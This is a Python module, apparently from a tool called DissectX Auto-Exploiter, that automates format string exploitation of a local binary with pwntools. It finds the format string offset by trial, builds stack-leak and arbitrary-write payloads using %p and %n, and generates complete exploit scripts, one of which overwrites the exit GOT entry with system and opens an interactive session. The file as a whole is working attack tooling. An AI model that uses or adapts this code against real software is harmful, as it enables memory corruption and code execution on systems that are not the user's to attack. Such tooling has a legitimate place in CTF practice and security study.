"""
Format String Exploitation Module for DissectX Auto-Exploiter

Automatically generates format string exploits for arbitrary read/write.
"""

from typing import Optional, Tuple


class FormatStringExploiter:
    """
    Automated format string exploitation
    """
    
    def __init__(self, binary_path: str):
        self.binary_path = binary_path
        self.offset = None  # Format string parameter offset
        
    def find_offset(self, test_string: str = "AAAA") -> Optional[int]:
        """
        Find the format string parameter offset
        
        Args:
            test_string: Test string to identify in output
            
        Returns:
            Offset number or None if not found
        """
        from pwn import process, cyclic, cyclic_find
        
        try:
            # Try different offsets
            for offset in range(1, 20):
                p = process(self.binary_path)
                
                # Send format string with offset
                payload = f"{test_string}%{offset}$p".encode()
                p.sendline(payload)
                
                try:
                    output = p.recvall(timeout=1).decode('utf-8', errors='ignore')
                    p.close()
                    
                    # Check if our test string appears in hex form
                    test_hex = test_string.encode().hex()
                    if test_hex in output.replace('0x', ''):
                        print(f"[+] Found format string offset: {offset}")
                        self.offset = offset
                        return offset
                except:
                    p.close()
                    continue
            
            return None
            
        except Exception as e:
            print(f"[-] Format string offset detection error: {e}")
            return None
    
    def generate_arbitrary_write(self, target_addr: int, value: int, offset: int) -> bytes:
        """
        Generate format string payload for arbitrary write
        
        Args:
            target_addr: Address to write to
            value: Value to write
            offset: Format string parameter offset
            
        Returns:
            Format string payload
        """
        from pwn import fmtstr_payload, p64
        
        try:
            # Use pwntools fmtstr_payload for convenience
            payload = fmtstr_payload(offset, {target_addr: value})
            return payload
        except:
            # Manual construction if pwntools fails
            payload = b''
            payload += p64(target_addr)
            payload += f"%{value}c%{offset}$n".encode()
            return payload
    
    def generate_leak_payload(self, offset: int, num_leaks: int = 10) -> bytes:
        """
        Generate payload to leak stack/memory values
        
        Args:
            offset: Format string parameter offset
            num_leaks: Number of values to leak
            
        Returns:
            Format string payload
        """
        payload = ""
        for i in range(offset, offset + num_leaks):
            payload += f"%{i}$p."
        
        return payload.encode()
    
    def generate_exploit_script(self, offset: int, target: str = "leak") -> str:
        """
        Generate complete format string exploit script
        
        Args:
            offset: Format string parameter offset
            target: 'leak' for info leak, 'write' for arbitrary write
            
        Returns:
            Python exploit script
        """
        script = []
        script.append("from pwn import *")
        script.append("")
        script.append(f"# Format String Exploitation")
        script.append(f"# Offset: {offset}")
        script.append("")
        script.append(f"exe = '{self.binary_path}'")
        script.append("elf = context.binary = ELF(exe, checksec=False)")
        script.append("io = process(exe)")
        script.append("")
        
        if target == "leak":
            script.append("# Strategy: Information Leak")
            script.append(f"# Leak {10} stack values")
            script.append("")
            script.append("payload = b''")
            for i in range(offset, offset + 10):
                script.append(f"payload += b'%{i}$p.'")
            script.append("")
            script.append("io.sendline(payload)")
            script.append("output = io.recvall()")
            script.append("print(output.decode('utf-8', errors='ignore'))")
            
        elif target == "write":
            script.append("# Strategy: Arbitrary Write")
            script.append("# Overwrite GOT entry or return address")
            script.append("")
            script.append("# Example: Overwrite exit@got with system")
            script.append("target_addr = elf.got['exit']")
            script.append("system_addr = elf.symbols.get('system', 0xdeadbeef)")
            script.append("")
            script.append(f"payload = fmtstr_payload({offset}, {{target_addr: system_addr}})")
            script.append("")
            script.append("io.sendline(payload)")
            script.append("io.interactive()")
        
        script.append("")
        return "\n".join(script)
